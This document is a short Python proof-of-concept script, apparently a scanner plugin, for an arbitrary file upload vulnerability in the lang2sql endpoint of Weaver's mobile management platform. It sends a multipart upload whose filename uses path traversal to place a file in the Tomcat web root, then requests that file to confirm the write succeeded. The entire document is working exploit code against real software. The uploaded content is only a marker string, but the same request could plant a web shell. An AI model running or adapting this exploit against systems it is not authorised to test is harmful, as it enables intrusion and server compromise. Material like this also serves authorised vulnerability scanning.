import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微移动管理平台lang2sql接口任意文件上传',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'Content-Type': 'multipart/form-data;boundary=----WebKitFormBoundarymVk33liI64J7GQaK',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Content-Length': '202',
        'Expect': '100-continue',
        'Connection': 'close'
    }
    data = '''
------WebKitFormBoundarymVk33liI64J7GQaK
Content-Disposition: form-data; name="file";filename="../../../../appsvr/tomcat/webapps/ROOT/9SIpL.txt"

b9Q2Itmn1
------WebKitFormBoundarymVk33liI64J7GQaK--
'''
    vurl = urllib.parse.urljoin(url, "/emp/lang2sql?client_type=1&lang_tag=1")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200 and '未知异常' in response.text:
            vurl = urllib.parse.urljoin(url, "/9SIpL.txt")
            response = requests.get(vurl, headers=headers, timeout=5)
            if response.status_code == 200 and 'b9Q' in response.text:
                relsult['vulnerable'] = True
                relsult['verify'] = vurl
        return relsult
    except:
        return relsult